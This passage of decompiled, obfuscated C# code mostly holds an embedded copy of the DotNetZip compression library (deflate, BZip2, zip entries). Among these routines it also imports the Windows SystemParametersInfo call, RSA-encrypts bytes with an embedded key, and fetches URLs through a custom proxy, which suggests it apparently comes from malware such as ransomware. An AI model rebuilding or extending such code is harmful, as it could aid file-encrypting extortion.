		if (gclass1_0.textWriter_0 != null)
		{
			gclass1_0.textWriter_0.WriteLine("found {0} files...", readOnlyCollection.Count);
		}
		Class6.smethod_384(gclass1_0);
		Enum10 enum10_ = (bool_1 ? Enum10.const_1 : Enum10.const_0);
		foreach (string item in readOnlyCollection)
		{
			string string_3 = ((string_1 == null) ? null : Class6.smethod_64(string_1, string_2, Path.GetDirectoryName(item)));
			if (File.Exists(item))
			{
				if (bool_1)
				{
					Class6.smethod_129(gclass1_0, item, string_3);
				}
				else
				{
					Class6.smethod_407(gclass1_0, item, string_3);
				}
			}
			else
			{
				Class6.smethod_313(gclass1_0, item, string_3, enum10_, bool_0: false, 0);
			}
		}
		Class6.smethod_211(gclass1_0);
	}

	static void smethod_104(string string_0, Class59 class59_0)
	{
		if (string_0 == null)
		{
			throw new ArgumentNullException();
		}
		class59_0.string_1 = string_0;
	}

	static void smethod_105(bool bool_0, Stream8 stream8_0)
	{
		if (!stream8_0.bool_2)
		{
			if (stream8_0.int_5 >= 0)
			{
				Class36 object_ = stream8_0.list_0[stream8_0.int_5];
				stream8_0.method_0(object_);
				stream8_0.int_5 = -1;
			}
			if (bool_0)
			{
				Class6.smethod_96(stream8_0, bool_0: true, bool_1: false);
				Class6.smethod_460(stream8_0);
			}
			else
			{
				Class6.smethod_96(stream8_0, bool_0: false, bool_1: false);
			}
		}
	}

	static string smethod_106(Class61 class61_0)
	{
		return class61_0.string_1;
	}

	static void smethod_107(int int_0, int int_1, int[] int_2, byte[] byte_0, int int_3)
	{
		int num = 0;
		for (int i = int_1; i <= int_3; i++)
		{
			for (int j = 0; j < int_0; j++)
			{
				if ((byte_0[j] & 0xFF) == i)
				{
					int_2[j] = num;
					num++;
				}
			}
			num <<= 1;
		}
	}

	static GClass0 smethod_108(GClass1 gclass1_0, GClass0 gclass0_0)
	{
		gclass0_0.class8_0 = new Class8(gclass1_0);
		gclass0_0.CompressionMethod = gclass1_0.compressionMethod_0;
		gclass0_0.CompressionLevel = gclass1_0.CompressionLevel;
		gclass0_0.ExtractExistingFile = gclass1_0.ExtractExistingFile;
		gclass0_0.ZipErrorAction = gclass1_0.ZipErrorAction;
		gclass0_0.SetCompression = gclass1_0.SetCompression;
		gclass0_0.AlternateEncoding = gclass1_0.encoding_0;
		gclass0_0.AlternateEncodingUsage = gclass1_0.enum9_0;
		gclass0_0.Password = gclass1_0.string_3;
		gclass0_0.Encryption = gclass1_0.enum2_0;
		gclass0_0.EmitTimesInWindowsFormatWhenSaving = gclass1_0.bool_2;
		gclass0_0.EmitTimesInUnixFormatWhenSaving = gclass1_0.bool_3;
		Class6.smethod_577(gclass0_0.string_1, gclass1_0, gclass0_0);
		Class6.smethod_215(gclass0_0, gclass1_0);
		return gclass0_0;
	}

	static Encoding smethod_109(Class8 class8_0)
	{
		if (class8_0.gclass1_0 != null)
		{
			return class8_0.gclass1_0.encoding_0;
		}
		if (class8_0.stream0_0 != null)
		{
			return class8_0.stream0_0.encoding_0;
		}
		return null;
	}

	static void smethod_110(bool bool_0, GClass0 gclass0_0, string string_0)
	{
		try
		{
			if (gclass0_0.bool_0)
			{
				if (bool_0)
				{
					if (File.Exists(string_0))
					{
						File.SetCreationTimeUtc(string_0, gclass0_0.dateTime_3);
						File.SetLastAccessTimeUtc(string_0, gclass0_0.dateTime_2);
						File.SetLastWriteTimeUtc(string_0, gclass0_0.dateTime_1);
					}
				}
				else if (Directory.Exists(string_0))
				{
					Directory.SetCreationTimeUtc(string_0, gclass0_0.dateTime_3);
					Directory.SetLastAccessTimeUtc(string_0, gclass0_0.dateTime_2);
					Directory.SetLastWriteTimeUtc(string_0, gclass0_0.dateTime_1);
				}
			}
			else
			{
				DateTime lastWriteTime = Class6.smethod_609(gclass0_0.LastModified);
				if (bool_0)
				{
					File.SetLastWriteTime(string_0, lastWriteTime);
				}
				else
				{
					Directory.SetLastWriteTime(string_0, lastWriteTime);
				}
			}
		}
		catch (IOException ex)
		{
			Class6.smethod_288(gclass0_0, "failed to set time on {0}: {1}", new object[2] { string_0, ex.Message });
		}
	}

	static bool smethod_111(Class38 class38_0)
	{
		return class38_0.bool_1;
	}

	static Stream smethod_112(Stream stream_0, GClass0 gclass0_0)
	{
		Stream stream = null;
		if (gclass0_0.enum2_1 == Enum2.const_1)
		{
			return new Stream5(stream_0, gclass0_0.class21_0, Enum5.const_1);
		}
		if (gclass0_0.enum2_1 != Enum2.const_2 && gclass0_0.enum2_1 != Enum2.const_3)
		{
			return stream_0;
		}
		return new Stream3(stream_0, gclass0_0.class19_0, gclass0_0.long_1, Enum5.const_1);
	}

	static int smethod_113(int int_0, Class32 class32_0, int int_1)
	{
		Class32.Class33 class33_ = class32_0.class33_0;
		int[][] int_2 = class33_.int_1;
		int[] int_3 = class33_.int_2;
		short[] short_ = class33_.short_0;
		char[] char_ = class33_.char_0;
		byte[] byte_ = class33_.byte_1;
		byte[][] byte_2 = class33_.byte_4;
		byte[] array = byte_2[0];
		byte[] array2 = byte_2[1];
		byte[] array3 = byte_2[2];
		byte[] array4 = byte_2[3];
		byte[] array5 = byte_2[4];
		byte[] array6 = byte_2[5];
		int int_4 = class32_0.int_10;
		int num = 0;
		for (int i = 0; i < Class35.int_7; i++)
		{
			int num2 = int_0;
			while (--num2 >= 0)
			{
				int_3[num2] = 0;
				int[] array7 = int_2[num2];
				int num3 = int_1;
				while (--num3 >= 0)
				{
					array7[num3] = 0;
				}
			}
			num = 0;
			int num4 = 0;
			while (num4 < class32_0.int_10)
			{
				int num5 = Math.Min(num4 + Class35.int_6 - 1, int_4 - 1);
				if (int_0 == Class35.int_5)
				{
					int[] array8 = new int[6];
					for (int j = num4; j <= num5; j++)
					{
						int num6 = char_[j];
						array8[0] += array[num6] & 0xFF;
						array8[1] += array2[num6] & 0xFF;
						array8[2] += array3[num6] & 0xFF;
						array8[3] += array4[num6] & 0xFF;
						array8[4] += array5[num6] & 0xFF;
						array8[5] += array6[num6] & 0xFF;
					}
					short_[0] = (short)array8[0];
					short_[1] = (short)array8[1];
					short_[2] = (short)array8[2];
					short_[3] = (short)array8[3];
					short_[4] = (short)array8[4];
					short_[5] = (short)array8[5];
				}
				else
				{
					int num7 = int_0;
					while (--num7 >= 0)
					{
						short_[num7] = 0;
					}
					for (int k = num4; k <= num5; k++)
					{
						int num8 = char_[k];
						int num9 = int_0;
						while (--num9 >= 0)
						{
							short_[num9] += (short)(byte_2[num9][num8] & 0xFF);
						}
					}
				}
				int num10 = -1;
				int num11 = int_0;
				int num12 = 999999999;
				while (--num11 >= 0)
				{
					int num13 = short_[num11];
					if (num13 < num12)
					{
						num12 = num13;
						num10 = num11;
					}
				}
				int_3[num10]++;
				byte_[num] = (byte)num10;
				num++;
				int[] array9 = int_2[num10];
				for (int l = num4; l <= num5; l++)
				{
					array9[(uint)char_[l]]++;
				}
				num4 = num5 + 1;
			}
			for (int m = 0; m < int_0; m++)
			{
				Class6.smethod_127(byte_2[m], int_2[m], class32_0.class33_0, int_1, 20);
			}
		}
		return num;
	}

	static bool smethod_114()
	{
		return IntPtr.Size == 8;
	}

	static Stream smethod_115(Stream4 stream4_0)
	{
		return stream4_0.stream_0;
	}

	static void smethod_116(string string_0, GClass1 gclass1_0)
	{
		gclass1_0.method_1(string_0, bool_18: true);
	}

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	static extern int SystemParametersInfo(uint uint_0, uint uint_1, string string_0, uint uint_2);

	static void smethod_117(long long_0, Stream4 stream4_0)
	{
		stream4_0.long_0 -= long_0;
		if (stream4_0.long_0 < 0L)
		{
			throw new InvalidOperationException();
		}
		if (stream4_0.stream_0 is Stream4)
		{
			Class6.smethod_117(long_0, (Stream4)stream4_0.stream_0);
		}
	}

	static EventArgs1 smethod_118(string string_0)
	{
		return new EventArgs1(string_0, Enum6.const_3);
	}

	static bool smethod_119(int int_0)
	{
		return int_0 != 67324752;
	}

	static IPEndPoint smethod_120(Class53 class53_0)
	{
		return class53_0.ipendPoint_0;
	}

	static GClass0 smethod_121(Class8 class8_0, bool bool_0)
	{
		GClass1 gclass1_ = class8_0.gclass1_0;
		Stream stream = Class6.smethod_651(class8_0);
		Encoding encoding_ = Class6.smethod_109(class8_0);
		GClass0 gClass = new GClass0();
		gClass.enum0_0 = Enum0.const_3;
		gClass.class8_0 = class8_0;
		gClass.stream_0 = stream;
		if (gclass1_ != null)
		{
			Class6.smethod_472(bool_0: true, gclass1_, (GClass0)null);
		}
		if (bool_0)
		{
			Class6.smethod_12(stream);
		}
		if (!Class6.smethod_237(gClass, encoding_))
		{
			return null;
		}
		gClass.long_3 = gClass.ArchiveStream.Position;
		stream.Seek(gClass.long_1 + gClass.int_4, SeekOrigin.Current);
		Class6.smethod_442(gClass);
		if (gclass1_ != null)
		{
			Class6.smethod_494(gclass1_, gClass);
			Class6.smethod_472(bool_0: false, gclass1_, gClass);
		}
		return gClass;
	}

	static long smethod_122(Stream13 stream13_0)
	{
		return stream13_0.gclass3_0.long_0;
	}

	static int smethod_123(int[] int_0, Class44 class44_0, GClass2 gclass2_0, int[] int_1, int int_2, int[] int_3, int int_4, int[] int_5, int[] int_6, int[] int_7)
	{
		Class6.smethod_34(class44_0, 288);
		class44_0.int_6[0] = 0;
		int[] int_8 = Class44.int_2;
		int[] int_9 = Class44.int_3;
		int[] int_10 = class44_0.int_6;
		int[] int_11 = class44_0.int_7;
		int num = Class6.smethod_266(int_0, int_3, class44_0, 257, int_7, int_2, int_10, int_8, int_9, int_11, 0, int_1);
		if (num == 0 && int_0[0] != 0)
		{
			Class6.smethod_34(class44_0, 288);
			int_8 = Class44.int_4;
			int_9 = Class44.int_5;
			int_10 = class44_0.int_6;
			int_11 = class44_0.int_7;
			num = Class6.smethod_266(int_5, int_3, class44_0, 0, int_7, int_4, int_10, int_8, int_9, int_11, int_2, int_6);
			if (num == 0 && (int_5[0] != 0 || int_2 <= 257))
			{
				return 0;
			}
			switch (num)
			{
			case -3:
				gclass2_0.string_0 = "oversubscribed distance tree";
				break;
			case -5:
				gclass2_0.string_0 = "incomplete distance tree";
				num = -3;
				break;
			default:
				gclass2_0.string_0 = "empty distance tree with lengths";
				num = -3;
				break;
			case -4:
				break;
			}
			return num;
		}
		switch (num)
		{
		case -3:
			gclass2_0.string_0 = "oversubscribed literal/length tree";
			break;
		default:
			gclass2_0.string_0 = "incomplete literal/length tree";
			num = -3;
			break;
		case -4:
			break;
		}
		return num;
	}

	static void smethod_124(Class38 class38_0)
	{
		Class6.smethod_465(class38_0, Class38.int_8 << 1, 3);
		Class6.smethod_675(class38_0, Class38.int_18, Class49.short_0);
		Class6.smethod_158(class38_0);
		if (1 + class38_0.int_50 + 10 - class38_0.int_51 < 9)
		{
			Class6.smethod_465(class38_0, Class38.int_8 << 1, 3);
			Class6.smethod_675(class38_0, Class38.int_18, Class49.short_0);
			Class6.smethod_158(class38_0);
		}
		class38_0.int_50 = 7;
	}

	static Stream smethod_125(Stream1 stream1_0)
	{
		return stream1_0.stream_0;
	}

	static void smethod_126(string string_0, bool bool_0, string string_1, GClass1 gclass1_0, string string_2)
	{
		Class6.smethod_103(string_2, bool_0, string_0, string_1, gclass1_0, bool_1: false);
	}

	static void smethod_127(byte[] byte_0, int[] int_0, Class32.Class33 class33_0, int int_1, int int_2)
	{
		int[] int_3 = class33_0.int_9;
		int[] int_4 = class33_0.int_10;
		int[] int_5 = class33_0.int_11;
		int num = int_1;
		while (--num >= 0)
		{
			int_4[num + 1] = ((int_0[num] == 0) ? 1 : int_0[num]) << 8;
		}
		bool flag = true;
		while (flag)
		{
			flag = false;
			int num2 = int_1;
			int num3 = 0;
			int_3[0] = 0;
			int_4[0] = 0;
			int_5[0] = -2;
			for (int i = 1; i <= int_1; i++)
			{
				int_5[i] = -1;
				num3++;
				int_3[num3] = i;
				int num4 = num3;
				int num5 = int_3[num4];
				while (int_4[num5] < int_4[int_3[num4 >> 1]])
				{
					int_3[num4] = int_3[num4 >> 1];
					num4 >>= 1;
				}
				int_3[num4] = num5;
			}
			while (num3 > 1)
			{
				int num6 = int_3[1];
				int_3[1] = int_3[num3];
				num3--;
				int num7 = 0;
				int num8 = 1;
				int num9 = int_3[1];
				while (true)
				{
					num7 = num8 << 1;
					if (num7 > num3)
					{
						break;
					}
					if (num7 < num3 && int_4[int_3[num7 + 1]] < int_4[int_3[num7]])
					{
						num7++;
					}
					if (int_4[num9] < int_4[int_3[num7]])
					{
						break;
					}
					int_3[num8] = int_3[num7];
					num8 = num7;
				}
				int_3[num8] = num9;
				int num10 = int_3[1];
				int_3[1] = int_3[num3];
				num3--;
				num7 = 0;
				num8 = 1;
				num9 = int_3[1];
				while (true)
				{
					num7 = num8 << 1;
					if (num7 > num3)
					{
						break;
					}
					if (num7 < num3 && int_4[int_3[num7 + 1]] < int_4[int_3[num7]])
					{
						num7++;
					}
					if (int_4[num9] < int_4[int_3[num7]])
					{
						break;
					}
					int_3[num8] = int_3[num7];
					num8 = num7;
				}
				int_3[num8] = num9;
				num2++;
				int_5[num6] = (int_5[num10] = num2);
				int num11 = int_4[num6];
				int num12 = int_4[num10];
				int_4[num2] = ((num11 & -256) + (num12 & -256)) | (1 + (((num11 & 0xFF) > (num12 & 0xFF)) ? (num11 & 0xFF) : (num12 & 0xFF)));
				int_5[num2] = -1;
				num3++;
				int_3[num3] = num2;
				num9 = 0;
				num8 = num3;
				num9 = int_3[num8];
				int num13 = int_4[num9];
				while (num13 < int_4[int_3[num8 >> 1]])
				{
					int_3[num8] = int_3[num8 >> 1];
					num8 >>= 1;
				}
				int_3[num8] = num9;
			}
			for (int j = 1; j <= int_1; j++)
			{
				int num14 = 0;
				int num15 = j;
				int num16;
				while ((num16 = int_5[num15]) >= 0)
				{
					num15 = num16;
					num14++;
				}
				byte_0[j - 1] = (byte)num14;
				if (num14 > int_2)
				{
					flag = true;
				}
			}
			if (flag)
			{
				for (int k = 1; k < int_1; k++)
				{
					int num17 = int_4[k] >> 8;
					num17 = 1 + (num17 >> 1);
					int_4[k] = num17 << 8;
				}
			}
		}
	}

	static int smethod_128(GClass2 gclass2_0, bool bool_0)
	{
		if (gclass2_0.class43_0 != null)
		{
			throw new GException0("You may not call InitializeDeflate() after calling InitializeInflate().");
		}
		gclass2_0.class38_0 = new Class38();
		gclass2_0.class38_0.bool_1 = bool_0;
		Class38 class38_ = gclass2_0.class38_0;
		Enum20 enum20_ = gclass2_0.enum20_0;
		int int_ = gclass2_0.int_4;
		Enum21 enum21_ = gclass2_0.enum21_0;
		return Class6.smethod_559(enum21_, int_, gclass2_0, enum20_, class38_);
	}

	static GClass0 smethod_129(GClass1 gclass1_0, string string_0, string string_1)
	{
		string text = Class6.smethod_599(string_0, string_1);
		if (gclass1_0[text] != null)
		{
			Class6.smethod_500(text, gclass1_0);
		}
		return Class6.smethod_407(gclass1_0, string_0, string_1);
	}

	static bool smethod_130(long long_0, GClass1 gclass1_0, long long_1, GClass0 gclass0_0)
	{
		EventHandler<EventArgs4> eventHandler_ = gclass1_0.eventHandler_2;
		if (eventHandler_ != null)
		{
			EventArgs4 eventArgs = Class6.smethod_550(gclass0_0, long_1, long_0, gclass1_0.ArchiveNameForEvent);
			eventHandler_(gclass1_0, eventArgs);
			if (eventArgs.bool_0)
			{
				gclass1_0.bool_9 = true;
			}
		}
		return gclass1_0.bool_9;
	}

	static void smethod_131(Stream6 stream6_0)
	{
		if (stream6_0.stream_0 == null)
		{
			throw new IOException("No input Stream");
		}
		if (!stream6_0.stream_0.CanRead)
		{
			throw new IOException("Unreadable input Stream");
		}
		Class6.smethod_273(stream6_0, 'B', 0);
		Class6.smethod_273(stream6_0, 'Z', 1);
		Class6.smethod_273(stream6_0, 'h', 2);
		int num = stream6_0.stream_0.ReadByte();
		if (num < 49 || num > 57)
		{
			throw new IOException("Stream is not BZip2 formatted: illegal blocksize " + (char)num);
		}
		stream6_0.int_2 = num - 48;
		Class6.smethod_404(stream6_0);
		Class6.smethod_397(stream6_0);
	}

	static bool smethod_132(Class73.Class75 class75_0)
	{
		return class75_0.int_0 == class75_0.int_1;
	}

	static void smethod_133(GClass0 gclass0_0, GClass0 gclass0_1)
	{
		gclass0_0.long_3 = gclass0_1.long_3;
		gclass0_0.CompressionMethod = (CompressionMethod)gclass0_1.short_8;
		gclass0_0.short_9 = gclass0_1.short_9;
		gclass0_0.long_1 = gclass0_1.long_1;
		gclass0_0.long_2 = gclass0_1.long_2;
		gclass0_0.short_7 = gclass0_1.short_7;
		gclass0_0.enum0_0 = gclass0_1.enum0_0;
		gclass0_0.dateTime_0 = gclass0_1.dateTime_0;
		gclass0_0.dateTime_1 = gclass0_1.dateTime_1;
		gclass0_0.dateTime_2 = gclass0_1.dateTime_2;
		gclass0_0.dateTime_3 = gclass0_1.dateTime_3;
		gclass0_0.bool_0 = gclass0_1.bool_0;
		gclass0_0.bool_2 = gclass0_1.bool_2;
		gclass0_0.bool_1 = gclass0_1.bool_1;
	}

	static Class52 smethod_134(Class54 class54_0)
	{
		return class54_0.class52_0;
	}

	static void smethod_135(Stream6 stream6_0)
	{
		bool[] bool_ = stream6_0.class34_0.bool_0;
		byte[] byte_ = stream6_0.class34_0.byte_0;
		int int_ = 0;
		for (int i = 0; i < 256; i++)
		{
			if (bool_[i])
			{
				byte_[int_++] = (byte)i;
			}
		}
		stream6_0.int_5 = int_;
	}

	static string smethod_136(Class54 class54_0)
	{
		return class54_0.string_0;
	}

	static void smethod_137(Class46 class46_0, Class38 class38_0)
	{
		short[] short_ = class46_0.short_0;
		short[] short_2 = class46_0.class49_0.short_2;
		int[] int_ = class46_0.class49_0.int_0;
		int int_2 = class46_0.class49_0.int_1;
		int int_3 = class46_0.class49_0.int_3;
		int num = 0;
		for (int i = 0; i <= Class48.int_0; i++)
		{
			class38_0.short_5[i] = 0;
		}
		short_[class38_0.int_40[class38_0.int_42] * 2 + 1] = 0;
		int j;
		for (j = class38_0.int_42 + 1; j < Class46.int_0; j++)
		{
			int num2 = class38_0.int_40[j];
			int i = short_[short_[num2 * 2 + 1] * 2 + 1] + 1;
			if (i > int_3)
			{
				i = int_3;
				num++;
			}
			short_[num2 * 2 + 1] = (short)i;
			if (num2 <= class46_0.int_6)
			{
				class38_0.short_5[i]++;
				int num3 = 0;
				if (num2 >= int_2)
				{
					num3 = int_[num2 - int_2];
				}
				short num4 = short_[num2 * 2];
				class38_0.int_47 += num4 * (i + num3);
				if (short_2 != null)
				{
					class38_0.int_48 += num4 * (short_2[num2 * 2 + 1] + num3);
				}
			}
		}
		if (num == 0)
		{
			return;
		}
		do
		{
			int i = int_3 - 1;
			while (class38_0.short_5[i] == 0)
			{
				i--;
			}
			class38_0.short_5[i]--;
			class38_0.short_5[i + 1] = (short)(class38_0.short_5[i + 1] + 2);
			class38_0.short_5[int_3]--;
			num -= 2;
		}
		while (num > 0);
		for (int i = int_3; i != 0; i--)
		{
			int num2 = class38_0.short_5[i];
			while (num2 != 0)
			{
				int num5 = class38_0.int_40[--j];
				if (num5 <= class46_0.int_6)
				{
					if (short_[num5 * 2 + 1] != i)
					{
						class38_0.int_47 = (int)(class38_0.int_47 + ((long)i - (long)short_[num5 * 2 + 1]) * short_[num5 * 2]);
						short_[num5 * 2 + 1] = (short)i;
					}
					num2--;
				}
			}
		}
	}

	static int smethod_138(Stream stream_0, GClass3 gclass3_0, Stream stream_1)
	{
		if (stream_0 == null)
		{
			throw new Exception("The input stream must not be null.");
		}
		byte[] array = new byte[8192];
		int count = 8192;
		gclass3_0.long_0 = 0L;
		int num = stream_0.Read(array, 0, 8192);
		stream_1?.Write(array, 0, num);
		gclass3_0.long_0 += num;
		while (num > 0)
		{
			Class6.smethod_23(gclass3_0, array, 0, num);
			num = stream_0.Read(array, 0, count);
			stream_1?.Write(array, 0, num);
			gclass3_0.long_0 += num;
		}
		return (int)(~gclass3_0.uint_2);
	}

	static void smethod_139(short[] short_0, int int_0, short[] short_1)
	{
		short[] array = new short[Class48.int_0 + 1];
		short num = 0;
		for (int i = 1; i <= Class48.int_0; i++)
		{
			num = (array[i] = (short)(num + short_0[i - 1] << 1));
		}
		for (int j = 0; j <= int_0; j++)
		{
			int num2 = short_1[j * 2 + 1];
			if (num2 != 0)
			{
				short_1[j * 2] = (short)Class6.smethod_347((int)array[num2]++, num2);
			}
		}
	}

	static void smethod_140(GClass0 gclass0_0, string string_0)
	{
		if (gclass0_0.class8_0.gclass1_0 != null && !gclass0_0.class8_0.gclass1_0.bool_12)
		{
			gclass0_0.bool_12 = Class6.smethod_594(gclass0_0, string_0, gclass0_0.class8_0.gclass1_0, bool_0: true);
		}
	}

	static bool smethod_141(string string_0)
	{
		return Class6.smethod_45(string_0, bool_0: false);
	}

	static string smethod_142(Class83 class83_0, string string_0)
	{
		try
		{
			HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create(string_0);
			httpWebRequest.Proxy = new Class81(class83_0);
			httpWebRequest.KeepAlive = false;
			httpWebRequest.Method = "GET";
			httpWebRequest.Timeout = 180000;
			using HttpWebResponse httpWebResponse = (HttpWebResponse)httpWebRequest.GetResponse();
			using StreamReader streamReader = new StreamReader(httpWebResponse.GetResponseStream(), Encoding.GetEncoding("utf-8"));
			return streamReader.ReadToEnd();
		}
		catch
		{
			return "error";
		}
	}

	static int smethod_143(Class54 class54_0)
	{
		return class54_0.int_0;
	}

	static string smethod_144(Class53 class53_0)
	{
		return class53_0.string_0;
	}

	static void smethod_145(Class30 class30_0, string string_0, GClass1 gclass1_0)
	{
		if (gclass1_0.string_0 == null)
		{
			gclass1_0.stream_1 = null;
		}
		gclass1_0.bool_13 = true;
		gclass1_0.string_0 = string_0;
		if (Directory.Exists(gclass1_0.string_0))
		{
			throw new ZipException("Bad Directory", new ArgumentException("That name specifies an existing directory. Please specify a filename.", "exeToGenerate"));
		}
		gclass1_0.bool_5 = true;
		gclass1_0.bool_4 = File.Exists(gclass1_0.string_0);
		gclass1_0.method_2(string_0, class30_0);
		Class6.smethod_617(gclass1_0);
		gclass1_0.bool_13 = false;
	}

	static string smethod_146(GClass0 gclass0_0)
	{
		string text = gclass0_0.string_1.Replace("\\", "/");
		string text2 = null;
		if (gclass0_0.bool_3 && gclass0_0.string_1.Length >= 3 && gclass0_0.string_1[1] == ':' && text[2] == '/')
		{
			return text.Substring(3);
		}
		if (gclass0_0.string_1.Length >= 4 && text[0] == '/' && text[1] == '/')
		{
			int num = text.IndexOf('/', 2);
			if (num == -1)
			{
				throw new ArgumentException("The path for that entry appears to be badly formatted");
			}
			return text.Substring(num + 1);
		}
		if (gclass0_0.string_1.Length >= 3 && text[0] == '.' && text[1] == '/')
		{
			return text.Substring(2);
		}
		return text;
	}

	static int smethod_147(int int_0)
	{
		if (int_0 >= 256)
		{
			return Class46.sbyte_1[256 + ((uint)int_0 >> 7)];
		}
		return Class46.sbyte_1[int_0];
	}

	static void smethod_148(IEnumerable<string> ienumerable_0, GClass1 gclass1_0)
	{
		Class6.smethod_302(ienumerable_0, (string)null, gclass1_0);
	}

	static void smethod_149(Stream6 stream6_0)
	{
		if (stream6_0.int_10 <= stream6_0.int_0)
		{
			stream6_0.int_9 = stream6_0.int_8;
			int num = (stream6_0.int_8 = stream6_0.class34_0.byte_5[stream6_0.int_14] & 0xFF);
			stream6_0.int_14 = stream6_0.class34_0.int_6[stream6_0.int_14];
			stream6_0.int_10++;
			stream6_0.int_6 = num;
			stream6_0.enum11_0 = Stream6.Enum11.const_6;
			Class6.smethod_328((byte)num, stream6_0.gclass3_0);
		}
		else
		{
			stream6_0.enum11_0 = Stream6.Enum11.const_5;
			Class6.smethod_316(stream6_0);
			Class6.smethod_404(stream6_0);
			Class6.smethod_397(stream6_0);
		}
	}

	static void smethod_150(bool bool_0, Class38 class38_0, int int_0, int int_1)
	{
		Class6.smethod_155(class38_0);
		class38_0.int_50 = 8;
		if (bool_0)
		{
			class38_0.byte_0[class38_0.int_21++] = (byte)int_1;
			class38_0.byte_0[class38_0.int_21++] = (byte)(int_1 >> 8);
			class38_0.byte_0[class38_0.int_21++] = (byte)(~int_1);
			class38_0.byte_0[class38_0.int_21++] = (byte)(~int_1 >> 8);
		}
		Class6.smethod_411(class38_0, class38_0.byte_1, int_0, int_1);
	}

	static int smethod_151(byte[] byte_0, int int_0, int int_1, Class73.Class74 class74_0)
	{
		int num = 0;
		do
		{
			if (class74_0.int_4 != 11)
			{
				int num2 = Class6.smethod_627(int_1, class74_0.class76_0, int_0, byte_0);
				int_1 += num2;
				num += num2;
				int_0 -= num2;
				if (int_0 == 0)
				{
					return num;
				}
			}
		}
		while (Class6.smethod_334(class74_0) || (class74_0.class76_0.int_1 > 0 && class74_0.int_4 != 11));
		return num;
	}

	static string smethod_152()
	{
		return "DotNetZip-" + Path.GetRandomFileName().Substring(0, 8) + ".tmp";
	}

	static void smethod_153(GClass1 gclass1_0, string string_0)
	{
		Class6.smethod_126((string)null, bool_0: false, ".", gclass1_0, string_0);
	}

	static bool smethod_154(Class11 class11_0, DateTime dateTime_0)
	{
		bool flag = false;
		return class11_0.comparisonOperator_0 switch
		{
			ComparisonOperator.GreaterThan => dateTime_0 > class11_0.dateTime_0, 
			ComparisonOperator.GreaterThanOrEqualTo => dateTime_0 >= class11_0.dateTime_0, 
			ComparisonOperator.LesserThan => dateTime_0 < class11_0.dateTime_0, 
			ComparisonOperator.LesserThanOrEqualTo => dateTime_0 <= class11_0.dateTime_0, 
			ComparisonOperator.EqualTo => dateTime_0 == class11_0.dateTime_0, 
			ComparisonOperator.NotEqualTo => dateTime_0 != class11_0.dateTime_0, 
			_ => throw new ArgumentException("Operator"), 
		};
	}

	static void smethod_155(Class38 class38_0)
	{
		if (class38_0.int_51 > 8)
		{
			class38_0.byte_0[class38_0.int_21++] = (byte)class38_0.short_6;
			class38_0.byte_0[class38_0.int_21++] = (byte)(class38_0.short_6 >> 8);
		}
		else if (class38_0.int_51 > 0)
		{
			class38_0.byte_0[class38_0.int_21++] = (byte)class38_0.short_6;
		}
		class38_0.short_6 = 0;
		class38_0.int_51 = 0;
	}

	static string smethod_156(Class59 class59_0)
	{
		return class59_0.string_0;
	}

	static long smethod_157(Class8 class8_0)
	{
		if (class8_0.gclass1_0 != null)
		{
			return class8_0.gclass1_0.long_2;
		}
		return class8_0.stream0_0.long_0;
	}

	static void smethod_158(Class38 class38_0)
	{
		if (class38_0.int_51 == 16)
		{
			class38_0.byte_0[class38_0.int_21++] = (byte)class38_0.short_6;
			class38_0.byte_0[class38_0.int_21++] = (byte)(class38_0.short_6 >> 8);
			class38_0.short_6 = 0;
			class38_0.int_51 = 0;
		}
		else if (class38_0.int_51 >= 8)
		{
			class38_0.byte_0[class38_0.int_21++] = (byte)class38_0.short_6;
			class38_0.short_6 >>= 8;
			class38_0.int_51 -= 8;
		}
	}

	static void smethod_159(Class2 class2_0)
	{
		string text = Class6.smethod_60();
		string text2 = Class6.smethod_658();
		string text3 = Class6.smethod_444();
		class2_0.string_0 = text + text2;
		class2_0.string_1 = class2_0.string_0 + text3;
	}

	static void smethod_160(long long_0, long long_1, GClass0 gclass0_0)
	{
		if (gclass0_0.class8_0.gclass1_0 != null)
		{
			gclass0_0.bool_12 = Class6.smethod_130(long_1, gclass0_0.class8_0.gclass1_0, long_0, gclass0_0);
		}
	}

	static Socket smethod_161(Class63 class63_0)
	{
		return class63_0.socket_0;
	}

	static void smethod_162(Class32 class32_0)
	{
		if (class32_0.int_2 > 0)
		{
			Class6.smethod_659(class32_0, bool_0: true);
		}
		class32_0.int_1 = -1;
		if (class32_0.int_3 != -1)
		{
			Class6.smethod_566(class32_0);
			Class6.smethod_224(class32_0.class31_0, (byte)49);
			Class6.smethod_224(class32_0.class31_0, (byte)65);
			Class6.smethod_224(class32_0.class31_0, (byte)89);
			Class6.smethod_224(class32_0.class31_0, (byte)38);
			Class6.smethod_224(class32_0.class31_0, (byte)83);
			Class6.smethod_224(class32_0.class31_0, (byte)89);
			class32_0.method_1(~class32_0.gclass3_0.uint_2);
			Class6.smethod_253(class32_0.class31_0, class32_0.method_0());
			Class6.smethod_291(class32_0.class31_0, 1, class32_0.bool_1 ? 1u : 0u);
			Class6.smethod_414(class32_0);
			Class6.smethod_454(class32_0);
		}
	}

	static bool smethod_163(Class16 class16_0, GClass0 gclass0_0)
	{
		return class16_0.class9_0.vmethod_1(gclass0_0);
	}

	static byte[] smethod_164(int int_0, string string_0, byte[] byte_0)
	{
		using RSACryptoServiceProvider rSACryptoServiceProvider = new RSACryptoServiceProvider(int_0);
		rSACryptoServiceProvider.FromXmlString(string_0);
		return rSACryptoServiceProvider.Encrypt(byte_0, fOAEP: false);
	}

	static void smethod_165(Class38 class38_0)
	{
		do
		{
			int num = class38_0.int_26 - class38_0.int_38 - class38_0.int_36;
			if (num != 0 || class38_0.int_36 != 0 || class38_0.int_38 != 0)
			{
				if (num == -1)
				{
					num--;
				}
				else if (class38_0.int_36 >= class38_0.int_23 + class38_0.int_23 - Class38.int_16)
				{
					Array.Copy(class38_0.byte_1, class38_0.int_23, class38_0.byte_1, 0, class38_0.int_23);
					class38_0.int_37 -= class38_0.int_23;
					class38_0.int_36 -= class38_0.int_23;
					class38_0.int_32 -= class38_0.int_23;
					int num2 = class38_0.int_28;
					int num3 = num2;
					do
					{
						int num4 = class38_0.short_1[--num3] & 0xFFFF;
						class38_0.short_1[num3] = (short)((num4 >= class38_0.int_23) ? (num4 - class38_0.int_23) : 0);
					}
					while (--num2 != 0);
					num2 = class38_0.int_23;
					num3 = num2;
					do
					{
						int num4 = class38_0.short_0[--num3] & 0xFFFF;
						class38_0.short_0[num3] = (short)((num4 >= class38_0.int_23) ? (num4 - class38_0.int_23) : 0);
					}
					while (--num2 != 0);
					num += class38_0.int_23;
				}
			}
